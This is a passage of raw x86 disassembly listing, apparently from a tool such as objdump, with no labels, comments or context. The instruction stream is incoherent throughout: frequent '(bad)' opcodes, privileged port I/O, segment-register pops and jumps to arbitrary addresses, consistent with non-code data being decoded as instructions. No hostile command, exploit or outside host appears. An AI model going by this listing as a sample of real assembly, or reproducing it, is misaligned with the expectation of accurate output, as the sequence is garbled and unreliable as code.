  4c7165:	(bad)  
  4c7167:	and    dl,BYTE PTR [ecx+0x75]
  4c716a:	fidivr WORD PTR [ecx+0x50]
  4c716d:	push   es
  4c716e:	pusha  
  4c716f:	adc    edi,DWORD PTR [eax]
  4c7171:	dec    eax
  4c7172:	jmp    0x75bbe985
  4c7177:	lock adc dl,BYTE PTR [edx+0x567e04de]
  4c717e:	pop    ss
  4c717f:	inc    esi
  4c7180:	xchg   BYTE PTR [ebx+ebx*8+0x40],ah
  4c7184:	push   es
  4c7185:	mov    dh,0x1c
  4c7187:	dec    edi
  4c7188:	jo     0x4c7120
  4c718a:	mov    edx,0x9915b087
  4c718f:	aaa    
  4c7190:	xor    eax,0xdba15739
  4c7195:	sbb    edx,DWORD PTR [eax-0x13b2c432]
  4c719b:	pusha  
  4c719c:	mov    eax,0x3a2ab1b0
  4c71a1:	and    eax,0x5a0b0a30
  4c71a6:	pop    ds
  4c71a7:	fidivr WORD PTR [ecx+0x5314733b]
  4c71ad:	adc    edx,DWORD PTR [eax+0x6f]
  4c71b0:	imul   ebx,edi,0xf95a638a
  4c71b6:	(bad)  
  4c71b8:	and    eax,0x6c46159f
  4c71bd:	jne    0x4c7232
  4c71bf:	push   0x7a1a7542
  4c71c4:	sub    ebx,DWORD PTR [edx]
  4c71c6:	push   ds
  4c71c7:	clc    
  4c71c8:	push   esp
  4c71c9:	movzx  esi,BYTE PTR [ecx-0x501e7699]
  4c71d0:	clc    
  4c71d1:	outs   dx,DWORD PTR ds:[esi]
  4c71d2:	ins    BYTE PTR es:[edi],dx
  4c71d3:	ins    DWORD PTR es:[edi],dx
  4c71d4:	xchg   esi,edx
  4c71d6:	(bad)  
  4c71d7:	push   0x33706c65
  4c71dc:	xor    dl,BYTE PTR [ebx+0x3a]
  4c71df:	jo     0x4c7249
  4c71e1:	outs   dx,DWORD PTR ds:[esi]
  4c71e2:	jo     0x4c7229
  4c71e4:	or     BYTE PTR [edx-0x7ddb664a],bh
  4c71ea:	je     0x4c7260
  4c71ec:	push   edi
  4c71ed:	and    DWORD PTR [esi+0x60],ecx
  4c71f0:	cmp    BYTE PTR ds:0x540bc206,al
  4c71f6:	imul   edx,eax,0xf7736d76
  4c71fc:	cmp    edi,edi
  4c71fe:	inc    ecx
  4c71ff:	je     0x4c7275
  4c7201:	bound  esi,QWORD PTR [ebp-0x5e]
  4c7204:	jae    0x4c7246
  4c7206:	and    BYTE PTR [edx+0x500cf736],al
  4c720c:	jns    0x4c7241
  4c720e:	pop    ds
  4c720f:	aaa    
  4c7210:	add    al,0xdd
  4c7212:	ret    
  4c7213:	mov    ds,WORD PTR [edi+esi*2+0x6b]
  4c7217:	fcomp  st(4)
  4c7219:	fisubr DWORD PTR [edi]
  4c721b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c721c:	sbb    eax,0x823376ca
  4c7221:	dec    ebp
  4c7222:	popa   
  4c7223:	or     BYTE PTR [edx-0x7caeeab8],ah
  4c7229:	je     0x4c7273
  4c722b:	push   eax
  4c722c:	shl    esi,0x49
  4c722f:	xchg   edx,eax
  4c7230:	add    bh,BYTE PTR [ebx+0x2223526d]
  4c7236:	push   ebp
  4c7237:	js     0x4c71c5
  4c7239:	dec    ecx
  4c723a:	sti    
  4c723b:	inc    ecx
  4c723c:	retf   
  4c723d:	pop    edx
  4c723e:	rcl    eax,cl
  4c7240:	and    BYTE PTR [ebp+0x79],ch
  4c7243:	out    0x80,eax
  4c7245:	arpl   WORD PTR [edi+0xa],si
  4c7248:	inc    ebp
  4c7249:	jae    0x4c72ad
  4c724b:	mov    esp,0x616f4cbb
  4c7250:	sbb    eax,0x7649a1a4
  4c7255:	sbb    esp,DWORD PTR [ebx+0x6b]
  4c7258:	push   ebx
  4c7259:	nop
  4c725a:	xchg   BYTE PTR [esi+0x666fae6d],ah
  4c7260:	pop    ds
  4c7261:	inc    ebp
  4c7262:	adc    eax,0x6498783c
  4c7267:	sbb    ecx,DWORD PTR [esi+0x61]
  4c726a:	ins    DWORD PTR es:[edi],dx
  4c726b:	aad    0x4f
  4c726d:	in     al,0x70
  4c726f:	rcl    eax,cl
  4c7271:	add    al,BYTE PTR [ecx+0x67f4aa04]
  4c7277:	push   ebx
  4c7278:	and    edx,0x12
  4c727b:	js     0x4c7248
  4c727d:	sbb    edx,DWORD PTR [eax-0x7133be2c]
  4c7283:	and    al,0x29
  4c7285:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c7286:	popa   
  4c7287:	(bad)  
  4c7288:	cmp    eax,ecx
  4c728a:	mov    ebx,0x43036198
  4c728f:	pop    edx
  4c7290:	imul   eax,DWORD PTR [esi+0x53],0xc59a3886
  4c7297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c7298:	add    DWORD PTR [ebp-0x5d],eax
  4c729b:	sub    ecx,DWORD PTR [ecx+eiz*1+0x49]
  4c729f:	push   ebx
  4c72a0:	sub    ebx,DWORD PTR [esi+esi*2+0x5b24957]
  4c72a7:	inc    ebx
  4c72a8:	pop    ebx
  4c72a9:	lds    esi,FWORD PTR ds:0x7053b641
  4c72af:	int3   
  4c72b0:	xchg   BYTE PTR [edi+eiz*2+0x3a],al
  4c72b4:	pop    ds
  4c72b5:	jns    0x4c732b
  4c72b7:	imul   ecx,DWORD PTR fs:[edi+0x1d1260d5],0x50
  4c72bf:	imul   esp,DWORD PTR [esi],0x78eb0663
  4c72c5:	fcmovbe st,st(0)
  4c72c7:	push   0x815b4718
  4c72cc:	mov    ebp,0x267f4b54
  4c72d1:	js     0x4c7323
  4c72d3:	and    al,0x68
  4c72d5:	push   edi
  4c72d6:	inc    esp
  4c72d7:	movhps xmm4,QWORD PTR [ebx+0x1b]
  4c72db:	sub    bh,cl
  4c72dd:	push   edi
  4c72de:	fisttp DWORD PTR [ecx-0x16]
  4c72e1:	jo     0x4c72fb
  4c72e3:	scas   al,BYTE PTR es:[edi]
  4c72e4:	aad    0x74
  4c72e6:	or     DWORD PTR [edx+0x59],ecx
  4c72e9:	cs stos DWORD PTR es:[edi],eax
  4c72eb:	pop    ebp
  4c72ec:	jp     0x4c7292
  4c72ee:	mov    ds:0x64149660,eax
  4c72f3:	out    0x70,eax
  4c72f5:	push   esi
  4c72f6:	pop    esp
  4c72f7:	sub    ecx,DWORD PTR [eax]
  4c72f9:	push   ebp
  4c72fa:	dec    ebp
  4c72fb:	sub    BYTE PTR [ecx-0x3a],ch
  4c72fe:	jo     0x4c7313
  4c7300:	test   eax,0xac6629e6
  4c7305:	inc    ebp
  4c7306:	mov    al,0xda
  4c7308:	push   0xffffff9b
  4c730a:	xor    eax,0xb6c56b37
  4c730f:	add    eax,0x396df55b
  4c7314:	outs   dx,DWORD PTR ds:[esi]
  4c7315:	pushf  
  4c7316:	push   ss
  4c7317:	test   DWORD PTR [edx],esp
  4c7319:	xchg   ecx,eax
  4c731a:	mov    ds:0x85810022,eax
  4c731f:	pop    ebp
  4c7320:	ja     0x4c733f
  4c7322:	xor    DWORD PTR [ebx+0x7b],ecx
  4c7325:	pop    ebx
  4c7326:	xchg   esi,eax
  4c7327:	adc    ebp,DWORD PTR [ebx]
  4c7329:	pop    ss
  4c732a:	das    
  4c732b:	push   edi
  4c732c:	jne    0x4c72e4
  4c732e:	repz adc bl,BYTE PTR [ebx+0x31]
  4c7332:	cli    
  4c7333:	inc    esp
  4c7334:	sbb    bh,BYTE PTR [ecx+0x70]
  4c7337:	or     al,BYTE PTR [edi+0x7c391b45]
  4c733d:	jae    0x4c73aa
  4c733f:	jae    0x4c739f
  4c7341:	aad    0x6c
  4c7343:	mov    ch,0xd7
  4c7345:	popa   
  4c7346:	arpl   WORD PTR [eax+0x29],bx
  4c7349:	and    eax,0xa55b4056
  4c734e:	and    al,0x59
  4c7350:	jne    0x4c72d4
  4c7352:	sar    eax,0x8c
  4c7355:	leave  
  4c7356:	icebp  
  4c7357:	mov    al,0x2d
  4c7359:	dec    esp
  4c735a:	popa   
  4c735b:	bound  ebx,QWORD PTR [edx+0x1d2e3947]
  4c7361:	push   edi
  4c7362:	shl    BYTE PTR [edx+0x64],cl
  4c7365:	dec    esp
  4c7366:	enter  0x766b,0x2c
  4c736a:	stos   BYTE PTR es:[edi],al
  4c736b:	into   
  4c736c:	or     al,0xb6
  4c736e:	push   0x6f
  4c7370:	inc    ebx
  4c7371:	pop    esi
  4c7372:	jo     0x4c73c8
  4c7374:	fs dec ebp
  4c7376:	test   DWORD PTR [edx-0x1b],eax
  4c7379:	mov    cl,0x3f
  4c737b:	loop   0x4c7303
  4c737d:	shl    DWORD PTR [ebx],0xc1
  4c7380:	ins    BYTE PTR es:[edi],dx
  4c7381:	test   DWORD PTR [ebp+0x6c504591],esp
  4c7387:	iret   
  4c7388:	mov    al,ds:0x152f14d9
  4c738d:	fwait
  4c738e:	outs   dx,BYTE PTR ds:[esi]
  4c738f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c7390:	xchg   esp,eax
  4c7391:	outs   dx,BYTE PTR ds:[esi]
  4c7392:	ins    BYTE PTR es:[edi],dx
  4c7393:	add    DWORD PTR [ebp+edi*1+0x69d056b8],ebp
  4c739a:	repnz and esi,DWORD PTR [ecx]
  4c739d:	pushf  
  4c739e:	or     al,0x1d
  4c73a0:	pop    ss
  4c73a1:	inc    edi
  4c73a2:	mov    esp,0xe5a11662
  4c73a7:	rcr    dl,0xc3
  4c73aa:	pop    ss
  4c73ab:	push   ebp
  4c73ac:	outs   dx,BYTE PTR ds:[esi]
  4c73ad:	ins    BYTE PTR es:[edi],dx
  4c73ae:	sbb    eax,DWORD PTR [ebp-0x13]
  4c73b1:	fcomp  DWORD PTR [esi+esi*2-0x60cc2a83]
  4c73b8:	pop    eax
  4c73b9:	xchg   edx,eax
  4c73ba:	push   ds
  4c73bb:	nop
  4c73bc:	pop    ss
  4c73bd:	or     eax,DWORD PTR [ebx]
  4c73bf:	or     eax,0xa2e6c020
  4c73c4:	fld    QWORD PTR [edx-0x2d]
  4c73c7:	loop   0x4c7393
  4c73c9:	mov    al,0xa1
  4c73cb:	inc    DWORD PTR [edi]
  4c73cd:	aad    0x92
  4c73cf:	outs   dx,BYTE PTR ds:[esi]
  4c73d0:	rol    DWORD PTR [ecx+0x229972b6],0x23
  4c73d7:	test   dh,dh
  4c73d9:	pop    eax
  4c73da:	fnstenv [ebx+0x4f]
  4c73dd:	sbb    ecx,DWORD PTR [eax+0x2fa2c230]
  4c73e3:	sbb    al,0x45
  4c73e5:	add    al,BYTE PTR [edi-0x755a4a40]
  4c73eb:	ds mov dh,0x30
  4c73ee:	loopne 0x4c73af
  4c73f0:	imul   esi,DWORD PTR [ecx],0xffffffaa
  4c73f3:	push   ebx
  4c73f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c73f5:	and    al,0x7d
  4c73f7:	pop    esp
  4c73f8:	outs   dx,DWORD PTR ds:[esi]
  4c73f9:	lock jns 0x4c73c9
  4c73fc:	mov    al,0xa1
  4c73fe:	lds    edx,FWORD PTR [edi+0x56c108a1]
  4c7404:	and    edi,0x37e9d97e
  4c740a:	call   0xe2d77def
  4c740f:	push   ebp
  4c7410:	fistp  DWORD PTR [ecx]
  4c7412:	inc    esi
  4c7413:	dec    edi
  4c7414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c7415:	je     0x4c7478
  4c7417:	adc    BYTE PTR [ebx-0x3a],0x18
  4c741b:	stos   BYTE PTR es:[edi],al
  4c741c:	fidiv  WORD PTR [ecx+0x1bd9f924]
  4c7422:	xlat   BYTE PTR ds:[ebx]
  4c7423:	stos   BYTE PTR es:[edi],al
  4c7424:	stos   DWORD PTR es:[edi],eax
  4c7425:	cli    
  4c7426:	inc    esp
  4c7427:	jne    0x4c7499
  4c7429:	loop   0x4c748e
  4c742b:	and    BYTE PTR [ecx+0x32e82dcd],ah
  4c7431:	ftst   
  4c7433:	mov    ds:0x41520858,eax
  4c7438:	stos   BYTE PTR es:[edi],al
  4c7439:	dec    edi
  4c743a:	(bad)  
  4c743b:	lahf   
  4c743c:	pusha  
  4c743d:	cs add bh,bl
  4c7440:	inc    ecx
  4c7441:	fs fs sub al,0x4f
  4c7445:	inc    ecx
  4c7446:	push   ebp
  4c7447:	sub    edx,eax
  4c7449:	or     bx,WORD PTR [ebx]
  4c744c:	loope  0x4c7425
  4c744e:	jbe    0x4c746d
  4c7450:	int    0x62
  4c7452:	dec    edi
  4c7453:	and    ch,BYTE PTR [ebp+edx*2+0x53]
  4c7457:	(bad)  
  4c7458:	cmp    eax,esp
  4c745a:	shl    BYTE PTR [eax],0xbb
  4c745d:	dec    ecx
  4c745e:	jae    0x4c7477
  4c7460:	stos   DWORD PTR es:[edi],eax
  4c7461:	test   ebx,esp
  4c7463:	jbe    0x4c7469
  4c7465:	jb     0x4c74b7
  4c7467:	into   
  4c7468:	ja     0x4c74bb
  4c746a:	lock push esi
  4c746c:	and    DWORD PTR [edx-0x2f],ecx
  4c746f:	sbb    DWORD PTR [eax+0x72],ecx
  4c7472:	call   0xcb73:0x41b9f1d6
  4c7479:	lods   eax,DWORD PTR ds:[esi]
  4c747a:	lea    ecx,[esp+esi*8]
  4c747d:	in     al,0x4d
  4c747f:	sub    eax,0x94db358f
  4c7484:	in     eax,dx
  4c7485:	jnp    0x4c7497
  4c7487:	pop    ds
  4c7488:	sbb    eax,0x8149c0b1
  4c748d:	cli    
  4c748e:	and    eax,0xe9c0ed83
  4c7493:	loop   0x4c7423
  4c7495:	sbb    al,0x70
  4c7497:	cdq    
  4c7498:	push   ebp
  4c7499:	jmp    DWORD PTR [edx-0x7f]
  4c749c:	cmp    eax,0xd04664b4
  4c74a1:	jne    0x4c7451
  4c74a3:	gs sti 
  4c74a5:	fcomp  QWORD PTR [ebx-0x6c]
  4c74a8:	xor    DWORD PTR ds:0x1561508c,esp
  4c74ae:	inc    ecx
  4c74af:	push   ss
  4c74b0:	fnop   
  4c74b2:	mov    ebx,0x454f0f3f
  4c74b7:	dec    ebp
  4c74b8:	adc    al,BYTE PTR [edx+0x780e456]
  4c74be:	cmp    BYTE PTR [edi+eax*8+0x61],cl
  4c74c2:	test   DWORD PTR [eax],ebp
  4c74c4:	mov    ecx,0x13f1a0c5
  4c74c9:	adc    DWORD PTR [eax+0x191d336f],edx
  4c74cf:	push   ebx
  4c74d0:	mov    ds:0xe74c5069,al
  4c74d5:	push   ebx
  4c74d6:	jg     0x4c7512
  4c74d8:	push   0xf118418f
  4c74dd:	jns    0x4c7543
  4c74df:	sub    edx,esi
  4c74e1:	call   0x7b612cf5
  4c74e6:	dec    edi
  4c74e7:	cmp    eax,ecx
  4c74e9:	xor    eax,0x5d830e5e
  4c74ee:	mov    bl,0x73
  4c74f0:	outs   dx,DWORD PTR ds:[esi]
  4c74f1:	jno    0x4c7561
  4c74f3:	dec    esp
  4c74f4:	inc    edi
  4c74f5:	cmp    DWORD PTR [ecx],esp
  4c74f7:	jg     0x4c74d0
  4c74f9:	push   edx
  4c74fa:	loope  0x4c74bf
  4c74fc:	cmp    dh,al
  4c74fe:	cmp    DWORD PTR [ecx],edi
  4c7500:	pop    ebx
  4c7501:	outs   dx,BYTE PTR ds:[esi]
  4c7502:	jle    0x4c7485
  4c7504:	rcr    BYTE PTR [esi+0x1b505612],0x53
  4c750b:	dec    esp
  4c750c:	inc    ebx
  4c750d:	dec    ebp
  4c750e:	jmp    0xab0cc5fd
  4c7513:	add    edx,DWORD PTR [edx+0x74]
  4c7516:	xchg   esp,eax
  4c7517:	ja     0x4c7536
  4c7519:	lds    esp,FWORD PTR [edx]
  4c751b:	les    esi,FWORD PTR [eax+0x2b5a291f]
  4c7521:	inc    edi
  4c7522:	and    BYTE PTR [eax+0x62bd6378],al
  4c7528:	or     edx,DWORD PTR [eax+0x5954dad]
  4c752e:	das    
  4c752f:	push   es
  4c7530:	or     ebx,DWORD PTR [esi+edx*1-0x70]
  4c7534:	pop    eax
  4c7535:	jno    0x4c74e0
  4c7537:	rol    BYTE PTR [edx],0x1b
  4c753a:	adc    al,0xfa
  4c753c:	mov    bl,0xcb
  4c753e:	addr16 lock adc al,0xe0
  4c7542:	cmp    eax,0x664f6401
  4c7547:	bndstx [ebp+0x798e6901],bnd1
  4c754e:	push   eax
  4c754f:	mov    al,0xa2
  4c7551:	adc    BYTE PTR [ecx],al
  4c7553:	jp     0x4c75c4
  4c7555:	gs inc edi
  4c7557:	jmp    0xf500:0xc6d78f42
  4c755e:	mov    BYTE PTR [eax],dl
  4c7560:	or     BYTE PTR [ebp+0x7bc2bb67],dh
  4c7566:	mov    cl,0xb8
  4c7568:	inc    ebx
  4c7569:	push   edi
  4c756a:	sbb    eax,0x36ea214b
  4c756f:	mov    ds:0x77654b47,eax
  4c7574:	pop    ebp
  4c7575:	sbb    BYTE PTR [ebp+0x58],al
  4c7578:	sub    dh,ch
  4c757a:	lea    ebx,[edi*4+0x28a9051f]
  4c7581:	sub    DWORD PTR [ecx+eax*2],ebp
  4c7584:	push   edi
  4c7585:	ja     0x4c75c1
  4c7587:	mov    eax,0x7c3c714d
  4c758c:	outs   dx,BYTE PTR ds:[esi]
  4c758d:	adc    dl,BYTE PTR [edx]
  4c758f:	push   0x6989ce57
  4c7594:	into   
  4c7595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c7596:	jge    0x4c7522
  4c7598:	jb     0x4c7615
  4c759a:	inc    eax
  4c759b:	sub    BYTE PTR [esi],dl
  4c759d:	ins    BYTE PTR es:[edi],dx
  4c759e:	sub    DWORD PTR [ecx+0x29],esp
  4c75a1:	dec    edi
  4c75a2:	pop    eax
  4c75a3:	shr    DWORD PTR [eax-0x48],0x6a
  4c75a7:	popa   
  4c75a8:	inc    esi
  4c75a9:	stos   DWORD PTR es:[edi],eax
  4c75aa:	ror    BYTE PTR [ecx],0x7b
  4c75ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c75ae:	or     edx,DWORD PTR [edi+ebp*2+0x6b]
  4c75b2:	adc    al,0xcd
  4c75b4:	add    al,0x91
  4c75b6:	test   eax,0xeb823b6
  4c75bb:	into   
  4c75bc:	lods   eax,DWORD PTR ds:[esi]
  4c75bd:	imul   edx,DWORD PTR [edx+0x70],0xffffffde
  4c75c1:	imul   ecx,DWORD PTR [edi+eiz*2-0x7fdd2c7b],0x9f344de0
  4c75cc:	fadd   DWORD PTR [ebx+0x28]
  4c75cf:	inc    eax
  4c75d0:	add    ecx,DWORD PTR [ebx+0x57]
  4c75d3:	retf   
  4c75d4:	(bad)  
  4c75d6:	test   DWORD PTR [edi],eax
  4c75d8:	pop    edx
  4c75d9:	push   0xf1f0679e
  4c75de:	dec    edx
  4c75df:	xor    al,BYTE PTR [eax+0x13]
  4c75e2:	jp     0x4c7659
  4c75e4:	jmp    0x4c7566
  4c75e6:	pop    es
  4c75e7:	ss cmp DWORD PTR es:[ebx],0x266c6341
  4c75ef:	das    
  4c75f0:	inc    eax
  4c75f1:	dec    edx
  4c75f2:	aas    
  4c75f3:	gs xchg edx,eax
  4c75f5:	mov    eax,0x648977bd
  4c75fa:	mov    ds:0x4cd19711,eax
  4c75ff:	cmp    cl,BYTE PTR [esi]
  4c7601:	fsubr  QWORD PTR [edx]
  4c7603:	mov    edi,0x6e833f6f
  4c7608:	mov    bl,0xd4
  4c760a:	fisubr WORD PTR [ecx]
  4c760c:	in     eax,0x66
  4c760e:	iret   
  4c760f:	fisubr WORD PTR [edi-0x80]
  4c7612:	mov    bl,0xd0
  4c7614:	pop    ebx
  4c7615:	and    al,0x94
  4c7617:	fimul  DWORD PTR [edi]
  4c7619:	loope  0x4c75cb
  4c761b:	dec    eax
  4c761c:	mov    cl,0x53
  4c761e:	jnp    0x4c7626
  4c7620:	jg     0x4c766d
  4c7622:	test   DWORD PTR [edi],esp
  4c7624:	push   esi
  4c7625:	xchg   edi,eax
  4c7626:	jns    0x4c75c3
  4c7628:	xchg   BYTE PTR [edx+0x6a704863],al
  4c762e:	jne    0x4c76a3
  4c7630:	and    esp,DWORD PTR [ecx+0x7c0ed973]
  4c7636:	mov    es,ebx
  4c7638:	dec    edx
  4c7639:	fst    QWORD PTR [ebx+0x68]
  4c763c:	jne    0x4c76b2
  4c763e:	shr    BYTE PTR [edi+0x6940eea7],1
  4c7644:	lahf   
  4c7645:	push   ebx
  4c7646:	outs   dx,BYTE PTR fs:[esi]
  4c7648:	es mov bl,0xe3
  4c764b:	cs mov dl,0x72
  4c764e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c764f:	mov    ebp,0x202e6c6
  4c7654:	xor    DWORD PTR [esi],ebp
  4c7656:	fimul  WORD PTR [edx-0x74]
  4c7659:	dec    ecx
  4c765a:	ins    DWORD PTR es:[edi],dx
  4c765b:	cmp    al,0x4c
  4c765d:	(bad)  
  4c765e:	pop    edi
  4c765f:	lahf   
  4c7660:	rcr    BYTE PTR [esi+0x18],0xd8
  4c7664:	and    edx,DWORD PTR [ebx+0x5c]
  4c7667:	sbb    BYTE PTR [esi],al
  4c7669:	test   BYTE PTR [esi],0x30
  4c766c:	ins    BYTE PTR es:[edi],dx
  4c766d:	cmp    BYTE PTR ds:0x5c2423b,ch
  4c7673:	out    0x3e,al
  4c7675:	ins    BYTE PTR es:[edi],dx
  4c7676:	outs   dx,BYTE PTR ds:[esi]
  4c7677:	aas    
  4c7678:	sub    DWORD PTR [edi],ebx
  4c767a:	fcom   DWORD PTR [ebx]
  4c767c:	mov    eax,ds:0x84298779
  4c7681:	jge    0x4c76b6
  4c7683:	add    ch,ah
  4c7685:	xor    al,0x5c
  4c7687:	jns    0x4c7683
  4c7689:	pop    es
  4c768a:	and    eax,0x9d2b8225
  4c768f:	mov    al,0x6b
  4c7691:	in     eax,dx
  4c7692:	mov    al,0x49
  4c7694:	arpl   WORD PTR [eax-0x68f446d3],sp
  4c769a:	test   BYTE PTR [edi+edi*8-0x1d],dh
  4c769e:	cmp    ebp,DWORD PTR [ebp+ebp*4+0x4f3ec790]
  4c76a5:	into   
  4c76a6:	sub    dh,BYTE PTR [eax+0x71]
  4c76a9:	sahf   
  4c76aa:	and    eax,0xf
  4c76ad:	mov    esp,0x7061cc85
  4c76b2:	pusha  
  4c76b3:	adc    al,0xa9
  4c76b5:	push   edi
  4c76b6:	and    ecx,eax
  4c76b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c76b9:	cmp    al,0x6d
  4c76bb:	pop    eax
  4c76bc:	sbb    al,0xc8
  4c76be:	fnsave [ecx]
  4c76c0:	jle    0x4c7684
  4c76c2:	dec    ebp
  4c76c3:	adc    eax,DWORD PTR [ecx+0x2c]
  4c76c6:	inc    ecx
  4c76c7:	jb     0x4c772c
  4c76c9:	or     edi,DWORD PTR [edi-0x67]
  4c76cc:	cmp    DWORD PTR [ecx],esi
  4c76ce:	js     0x4c7684
  4c76d0:	cmp    dl,ch
  4c76d2:	out    dx,eax
  4c76d3:	xor    esi,DWORD PTR [edx]
  4c76d5:	das    
  4c76d6:	mov    ds:0x1e927745,eax
  4c76db:	imul   edi,ebp,0x40c23b8e
  4c76e1:	pop    ss
  4c76e2:	pop    esp
  4c76e3:	inc    ecx
  4c76e4:	or     BYTE PTR [ebp+0x25],ah
  4c76e7:	or     ebx,ebx
  4c76e9:	and    DWORD PTR [ebx],ecx
  4c76eb:	pop    ss
  4c76ec:	add    BYTE PTR [ecx],ch
  4c76ee:	push   cs
  4c76ef:	mov    ah,0x4d
  4c76f1:	mov    dh,0x26
  4c76f3:	imul   edi,DWORD PTR [eax-0x2e],0x8675afd
  4c76fa:	add    al,0x80
  4c76fc:	xor    al,0x44
  4c76fe:	std    
  4c76ff:	inc    ebx
  4c7700:	mov    ebp,0xa0c0815a
  4c7705:	mov    dl,dl
  4c7707:	lods   al,BYTE PTR ds:[esi]
  4c7708:	jo     0x4c7739
  4c770a:	fsubr  st(4),st
  4c770c:	rcr    DWORD PTR [ebp+0x4e844344],0x63
  4c7713:	je     0x4c76e0
  4c7715:	or     edi,esi
  4c7717:	add    ebx,esi
  4c7719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c771a:	arpl   WORD PTR [eax+0x42],bp
  4c771d:	ins    BYTE PTR es:[edi],dx
  4c771e:	fild   DWORD PTR [ecx+ecx*2+0x74]
  4c7722:	and    BYTE PTR [ebx+0x21f7e25e],al
  4c7728:	inc    ebx
  4c7729:	(bad)  
  4c772a:	out    dx,eax
  4c772b:	rol    cl,0x71
  4c772e:	iret   
  4c772f:	sahf   
  4c7730:	pop    ebp
  4c7731:	retf   
  4c7732:	(bad)  
  4c7733:	pusha  
  4c7734:	jo     0x4c7711
  4c7736:	add    BYTE PTR [edi+0x15],0xcb
  4c773a:	es stos DWORD PTR es:[edi],eax
  4c773c:	bound  eax,QWORD PTR [ecx+0x527a4893]
  4c7742:	and    eax,0xbc796cd0
  4c7747:	or     DWORD PTR [esi],ebp
  4c7749:	in     al,dx
  4c774a:	inc    esi
  4c774b:	ja     0x4c775f
  4c774d:	idiv   DWORD PTR [ebx+0x52]
  4c7750:	in     al,0x61
  4c7752:	adc    dh,ah
  4c7754:	dec    edi
  4c7755:	cmp    BYTE PTR [ecx],dh
  4c7757:	and    DWORD PTR [ecx+0x65],ebp
  4c775a:	ja     0x4c77bc
  4c775c:	rcr    ebp,0xc7
  4c775f:	ror    BYTE PTR [edi+0x72],1
  4c7762:	addr16 mov dl,0x9e
  4c7765:	sub    DWORD PTR [edx],edx
  4c7767:	hlt    
  4c7768:	add    bh,BYTE PTR [edi]
  4c776a:	inc    ebp
  4c776b:	inc    edx
  4c776c:	imul   edx,DWORD PTR [ebx-0x191353ae],0xffffffce
  4c7773:	xor    al,0x71
  4c7775:	sub    eax,DWORD PTR [ebx-0x50]
  4c7778:	jae    0x4c7727
  4c777a:	mov    dl,0xd9
  4c777c:	sbb    dh,BYTE PTR [edi+0x15]
  4c777f:	push   ebx
  4c7780:	cs push esi
  4c7782:	inc    edx
  4c7783:	jb     0x4c778c
  4c7785:	jae    0x4c77ff
  4c7787:	push   cs
  4c7788:	mov    WORD PTR [ecx-0x1b],ss
  4c778b:	push   ebp
  4c778c:	inc    esi
  4c778d:	loope  0x4c7800
  4c778f:	adc    al,0x17
  4c7791:	out    0x57,al
  4c7793:	sbb    eax,DWORD PTR [esi+0x4e]
  4c7796:	test   BYTE PTR [eax],dh
  4c7798:	lods   al,BYTE PTR ds:[esi]
  4c7799:	ss ret 
  4c779b:	mov    ds:0x854f9f1b,al
  4c77a0:	loopne 0x4c7792
  4c77a2:	into   
  4c77a3:	test   al,0x26
  4c77a5:	fcom   DWORD PTR [ebx]
  4c77a7:	push   edi
  4c77a8:	dec    esi
  4c77a9:	or     al,0xb8
  4c77ab:	nop
  4c77ac:	add    esi,DWORD PTR [eax+0x69016c1e]
  4c77b2:	not    DWORD PTR [esi]
  4c77b4:	stos   DWORD PTR es:[edi],eax
  4c77b5:	pop    eax
  4c77b6:	jp     0x4c77e7
  4c77b8:	js     0x4c77e3
  4c77ba:	mov    ebp,0x276d5b52
  4c77bf:	jl     0x4c7812
  4c77c1:	je     0x4c77dd
  4c77c3:	iret   
  4c77c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c77c5:	lods   eax,DWORD PTR ds:[esi]
  4c77c6:	push   ecx
  4c77c7:	mov    edx,0x4f17f02e
  4c77cc:	pop    es
  4c77cd:	add    ch,BYTE PTR [eax+edx*8]
  4c77d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c77d1:	add    ch,BYTE PTR [esi+0x75]
  4c77d4:	sub    DWORD PTR [ebp+0x6b],ecx
  4c77d7:	sbb    al,0x99
  4c77d9:	popa   
  4c77da:	or     eax,0xb264725a
  4c77df:	pushf  
  4c77e0:	jns    0x4c77f0
  4c77e2:	sbb    al,BYTE PTR [ebp+0x6f53cd79]
  4c77e8:	popa   
  4c77e9:	inc    esp
  4c77ea:	fs inc edx
  4c77ec:	(bad)  
  4c77ed:	mov    db3,edi
  4c77f0:	dec    esp
  4c77f1:	push   ebx
  4c77f2:	dec    ecx
  4c77f3:	inc    esp
  4c77f4:	inc    esi
  4c77f5:	dec    esi
  4c77f6:	ins    DWORD PTR es:[edi],dx
  4c77f7:	mov    al,ds:0xf3b32ed
  4c77fc:	and    BYTE PTR [edi],cl
  4c77fe:	and    eax,DWORD PTR [edi+0x55]
  4c7801:	xor    dh,BYTE PTR [edx]
  4c7803:	dec    esp
  4c7804:	xchg   edi,eax
  4c7805:	add    bl,BYTE PTR [eax]
  4c7807:	mov    edi,eax
  4c7809:	sbb    edx,DWORD PTR [ebp+0x10]
  4c780c:	pop    ecx
  4c780d:	xchg   cl,al
  4c780f:	pop    ds
  4c7810:	cmp    DWORD PTR [esi-0xc],eax
  4c7813:	fcomp  QWORD PTR [esi]
  4c7815:	arpl   WORD PTR [eax],si
  4c7817:	retf   
  4c7818:	cdq    
  4c7819:	sub    ch,dh
  4c781b:	dec    edi
  4c781c:	outs   dx,BYTE PTR ds:[esi]
  4c781d:	dec    eax
  4c781e:	inc    esi
  4c781f:	add    DWORD PTR [edx+0x5451a763],edi
  4c7825:	shr    BYTE PTR [ebx+0x17],cl
  4c7828:	ror    BYTE PTR [esi+0x1fa5b620],cl
  4c782e:	xor    DWORD PTR [esp],ebx
  4c7831:	push   0x1167f0c0
  4c7836:	and    ecx,DWORD PTR [edi-0x46]
  4c7839:	lods   eax,DWORD PTR ds:[esi]
  4c783a:	sbb    eax,0x42abef5f
  4c783f:	test   al,0x74
  4c7841:	rol    BYTE PTR [ecx-0x4a],0x82
  4c7845:	js     0x4c78b4
